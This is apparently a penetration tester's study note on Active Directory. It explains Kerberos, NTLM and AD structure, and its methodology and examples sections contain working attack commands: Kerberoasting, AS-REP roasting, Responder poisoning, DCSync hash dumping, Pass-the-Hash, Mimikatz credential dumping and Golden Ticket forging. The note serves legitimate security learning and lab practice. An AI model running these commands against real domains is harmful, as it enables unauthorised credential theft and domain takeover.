# 📌 Active Directory (AD)

> Microsoft's centralized identity & access management system — the backbone of 90%+ of enterprise Windows networks, and one of the biggest attack surfaces in existence.

---

## 🔍 Definition

Active Directory is a directory service developed by Microsoft that stores and manages information about network objects (users, computers, groups, policies) and controls authentication and authorization across an entire Windows domain. A single Domain Controller (DC) running AD can govern thousands of machines and users. A misconfiguration or compromised account can cascade into full domain takeover.

---

## 🧠 Core Concepts

- **Domain** — Logical grouping of all objects under one namespace (e.g., `corp.local`). Everything lives in a domain.
- **Domain Controller (DC)** — The server running AD. Handles all auth requests. Owns the keys to the kingdom — compromising it = game over.
- **users and Groups** — Accounts of the users and the groups they are in eg: Admins,HR,etc
- **Forest** — A collection of one or more domains sharing a schema and global catalog. Multiple domains = multiple forests possible.
- **Trust Relationships** — Two domains/forests can trust each other, meaning users in one can access resources in the other. Abuse of trusts = lateral movement across forests.
- **Organizational Unit (OU)** — Container within a domain used to organize objects. GPOs are applied to OUs.
- **Group Policy Object (GPO)** — Rules pushed from DC to machines/users. Controls everything from password policies to software installs. Misconfigured GPOs = easy privesc.
- **SPN (Service Principal Name)** — Unique identifier for a service instance. e.g., `HTTP/webserver.corp.local`. Required for Kerberos service auth. **Kerberoasting targets these.**
- **LDAP** — Protocol AD uses to expose its data. Port **389** (plaintext), **636** (SSL). Used to enumerate users, groups, OUs.
- **Kerberos** — AD's primary auth protocol. Port **88**. Ticket-based. No plaintext passwords over the wire — but the tickets themselves are crackable.
- **NTLM** — Older fallback auth protocol. Hash-based. No tickets. Vulnerable to Pass-the-Hash and relay attacks.
- **Global Catalog (GC)** — DC that holds a partial copy of all objects in the forest. Port **3268**. Useful for cross-domain lookups.
---

## ⚙️ How Kerberos Works (The Auth Flow)

Kerberos is where most AD attacks live. Know this cold.

1. **AS-REQ** — Client sends an authentication request to the KDC (Key Distribution Center, which runs on the DC). Includes a timestamp encrypted with the user's password hash (this is **pre-authentication**).
2. **AS-REP** — KDC verifies the timestamp, then issues a **TGT (Ticket Granting Ticket)** encrypted with the `krbtgt` account's hash. Client stores this.
3. **TGS-REQ** — Client presents TGT and requests access to a specific service (by SPN). No password needed again.
4. **TGS-REP** — KDC returns a **TGS (Ticket Granting Service)** ticket, encrypted with the **service account's** password hash.
5. **AP-REQ** — Client presents TGS to the actual service. Service decrypts it with its own hash and grants access.

> 💡 Attack insight: Steps 4 and 5 are where Kerberoasting lives — the TGS is encrypted with the service account's hash, so an attacker who can request it can take it offline and crack it. Step 2 is where AS-REP Roasting lives — if pre-auth is disabled, anyone can request a TGT and get an encrypted blob without proving identity first.

---

## 📖 Key Terminology

|Term|Meaning|
|---|---|
|KDC|Key Distribution Center — the DC component that issues Kerberos tickets|
|TGT|Ticket Granting Ticket — proof of identity, used to request service tickets|
|TGS|Ticket Granting Service — grants access to a specific service|
|SPN|Service Principal Name — identifier tied to a service account|
|krbtgt|Special AD account whose hash encrypts all TGTs — the holy grail|
|NTLM Hash|Password hash used in legacy auth — reusable in Pass-the-Hash|
|ACL|Access Control List — defines permissions on AD objects. Misconfigured ACLs = attack path|
|gMSA|Group Managed Service Account — auto-rotating passwords, resistant to Kerberoasting|
|BloodHound|Tool that maps AD attack paths via graph analysis|
|DCSync|Technique to replicate DC data (dump all hashes) if you have the right perms|
|Golden Ticket|Forged TGT using the `krbtgt` hash — persistent domain access|
|Silver Ticket|Forged TGS for a specific service — stealthier than golden ticket|

---

## 🔥 Important Details & Gotchas

- **80% of cyberattacks exploit AD vulnerabilities** (Mandiant 2025). It's not a niche attack surface — it's the main one.
- **Kerberoasting doesn't exploit a Kerberos bug** — it abuses weak service account passwords. Kerberos is working as designed. The mistake is human.
- **RC4 encryption is still supported by Microsoft** for backward compatibility. RC4-encrypted TGS tickets crack significantly faster than AES ones.
- **AS-REP Roasting requires zero creds** — if pre-auth is disabled on an account, you don't even need to be authenticated to grab a crackable hash.
- **Kerberoasting requires at least one valid domain user** — it's post-foothold.
- **DCSync requires replication permissions** (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) — typically Domain Admin or equivalent.
- **Golden Ticket persists even after password resets** — you need to rotate the `krbtgt` account's password **twice** to invalidate it.
- **BloodHound attack paths aren't always obvious** — a user with `WriteDACL` on a group → can add themselves → gets privileges. Always run it before assuming no path.
- **BadSuccessor (2025)** — Akamai researcher discovered a privesc in Windows Server 2025 abusing dMSA that can compromise any user in AD. Keep an eye on this.

---

## 🌍 Real-World Usage / Examples

**Kerberoasting in practice:**

```bash
# From Kali (no domain join needed, just creds)
impacket-GetUserSPNs corp.local/lowprivuser:Password1 -dc-ip 10.10.10.1 -request
# Outputs hash in $krb5tgs$23$* format — crack with hashcat

hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

**AS-REP Roasting (no creds needed if you have a user list):**

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass -format hashcat
# Outputs $krb5asrep$23$ hashes

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**BloodHound collection from Kali:**

```bash
bloodhound-python -u lowprivuser -p Password1 -d corp.local -ns 10.10.10.1 -c All
# Import JSON files into BloodHound GUI → find path to Domain Admin
```

**DCSync (needs DA or replication privs):**

```bash
impacket-secretsdump corp.local/domainadmin:pass@10.10.10.1
# Dumps all NTLM hashes — use for Pass-the-Hash or offline cracking
```

**LLMNR Poisoning (no creds, captures NTLMv2 hashes passively):**

```bash
sudo responder -I eth0 -rdwv
# Captures hashes when users try to resolve hostnames on the network
# Crack with: hashcat -m 5600 ntlmv2.hash rockyou.txt
```

**Pass-the-Hash (use NTLM hash directly, no cracking):**

```bash
evil-winrm -i 10.10.10.1 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ntlmhash
crackmapexec smb 10.10.10.0/24 -u Administrator -H ntlmhash
```

**Real-world context:** The 2024 Ascension healthcare ransomware breach involved Kerberoasting as a key step. Used by groups like APT29, Scattered Spider, and virtually every ransomware gang operating today.

---

## 🗺️ Pentest Methodology

### Phase 1 — No Creds (Black Box)

```bash
# Host/DC discovery
nmap -sn 10.10.10.0/24
nmap -sV -sC -p 53,88,135,139,389,445,464,636,3268 <DC-IP>

# Null session / anonymous enum
crackmapexec smb <DC-IP> -u '' -p ''
enum4linux-ng <DC-IP>
ldapsearch -x -H ldap://<DC-IP> -b "DC=corp,DC=local"

# Hash capture (passive)
sudo responder -I eth0 -rdwv

# Username enumeration (no creds)
kerbrute userenum --dc <DC-IP> -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roast with user list
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass
```

### Phase 2 — With Low-Priv Creds

```bash
# Full enum
crackmapexec smb <DC-IP> -u user -p pass --users --groups --shares --pass-pol
bloodhound-python -u user -p pass -d corp.local -ns <DC-IP> -c All

# Kerberoast
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC-IP> -request

# Check ACL abuse paths in BloodHound (Shortest Path to Domain Admins)
# Look for: WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember
```

### Phase 3 — Escalation & Post-Exploit

```bash
# If DA or replication rights
impacket-secretsdump corp.local/user:pass@<DC-IP>

# Pass the Hash
evil-winrm -i <IP> -u Administrator -H <hash>
crackmapexec smb <subnet>/24 -u Administrator -H <hash> --local-auth

# Dump LSASS (on compromised Windows host)
# Via mimikatz: privilege::debug → sekurlsa::logonpasswords

# Golden Ticket (if you have krbtgt hash)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@<DC-IP>
```

---

## 🛠️ Tools Cheatsheet

|Tool|What it does|
|---|---|
|`bloodhound-python` + BloodHound GUI|Maps attack paths, finds shortest path to DA|
|`impacket` suite|GetUserSPNs, GetNPUsers, secretsdump, psexec, ticketer|
|`crackmapexec` (CME/netexec)|SMB/LDAP/WinRM enum and spraying|
|`Responder`|LLMNR/NBT-NS poisoning → hash capture|
|`evil-winrm`|Shell via WinRM using hash or password|
|`Rubeus`|Windows-side Kerberos attacks (roasting, ticket manipulation)|
|`Mimikatz`|LSASS dump, Pass-the-Hash, DCSync, Golden/Silver ticket|
|`kerbrute`|Username enum and password spraying via Kerberos|
|`ldapsearch`|Manual LDAP queries for AD enumeration|
|`PingCastle`|AD security auditing — finds misconfigs at scale|
|`Certipy`|AD Certificate Services (AD CS) attacks|

---

## 🔥 Attack Summary Table

|Attack|Requires|What You Get|Stealth|
|---|---|---|---|
|LLMNR Poisoning|Network access|NTLMv2 hashes|Medium|
|AS-REP Roasting|User list (no creds)|Crackable user hashes|High|
|Kerberoasting|Any domain user|Crackable service acct hashes|High|
|Pass-the-Hash|NTLM hash|Lateral movement without creds|High|
|Pass-the-Ticket|Kerberos ticket|Access to services|High|
|DCSync|Replication perms|All domain hashes|Low|
|BloodHound ACL Abuse|Low priv creds|Escalation path to DA|Medium|
|Golden Ticket|`krbtgt` hash|Persistent domain access|High|
|Silver Ticket|Service acct hash|Access to specific service|Very High|
|AD CS Attack (ESC1-8)|Low priv creds|Certificate → TGT → DA|High|

---

## 🔗 Related Topics

- [[Kerberos Authentication]]
- [[NTLM and Pass-the-Hash]]
- [[BloodHound & Attack Path Analysis]]
- [[AD Certificate Services (AD CS)]]
- [[Lateral Movement]]
- [[Privilege Escalation - Windows]]
- [[LDAP Enumeration]]
- [[SMB Enumeration]]

---

## 📚 Sources / Further Reading

- [HTB Academy - Active Directory Enumeration & Attacks](https://academy.hackthebox.com/) — most practical AD course out there
- [BloodHound Documentation](https://bloodhound.readthedocs.io/) — mandatory read for understanding attack paths
- [SpecterOps Blog](https://posts.specterops.io/) — the people who built BloodHound, cutting-edge AD research
- [Orange Cyberdefense AD Mindmap (2025)](https://orange-cyberdefense.github.io/ocd-mindmaps/) — visual attack path reference, updated March 2025
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples) — source for all the scripts you'll use
- HTB Machines to practice: `Active`, `Forest`, `Cascade`, `Sauna`, `Resolute`, `Return`
- TryHackMe: `Attacktive Directory` room — good intro lab

